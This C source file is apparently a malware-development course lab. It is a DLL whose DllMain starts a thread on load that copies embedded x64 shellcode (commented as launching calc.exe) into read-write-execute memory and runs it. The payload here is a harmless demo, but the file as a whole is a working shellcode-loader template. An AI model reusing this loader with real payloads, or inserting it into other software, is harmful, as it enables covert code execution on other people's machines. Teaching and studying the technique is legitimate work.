/*
* Lab 07 | Malware Dev Fall 2023
* DLL Payload
* coremed | willjcim
*/

#include <windows.h>
#include <stdio.h>

// x64 calc.exe shellcode
unsigned char shellcode[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6";



DWORD WINAPI ThreadFunction(LPVOID lpParameter) {

	LPVOID newMemory;
	HANDLE currentProcess;
	SIZE_T bytesWritten;
	BOOL didWeCopy = FALSE;

	// Get the current process handle 
	currentProcess = GetCurrentProcess();


	// Allocate memory with Read+Write+Execute permissions 
	newMemory = VirtualAllocEx(currentProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (newMemory == NULL)
		return -1;

	// Copy the shellcode into the memory we just created 
	didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&shellcode, sizeof(shellcode), &bytesWritten);

	if (!didWeCopy)
		return -2;

	// Execute our shellcode
	((void(*)())newMemory)();

	return 1;
}


BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {

	HANDLE threadHandle;

	switch (dwReason) {
	case DLL_PROCESS_ATTACH:

		// Create a thread and close the handle as we do not want to use it to wait for it 

		threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);
		CloseHandle(threadHandle);

		break;

	case DLL_PROCESS_DETACH:
		// Code to run when the DLL is freed
		break;

	case DLL_THREAD_ATTACH:
		// Code to run when a thread is created during the DLL's lifetime
		break;

	case DLL_THREAD_DETACH:
		// Code to run when a thread ends normally
		break;
	}
	return TRUE;
}
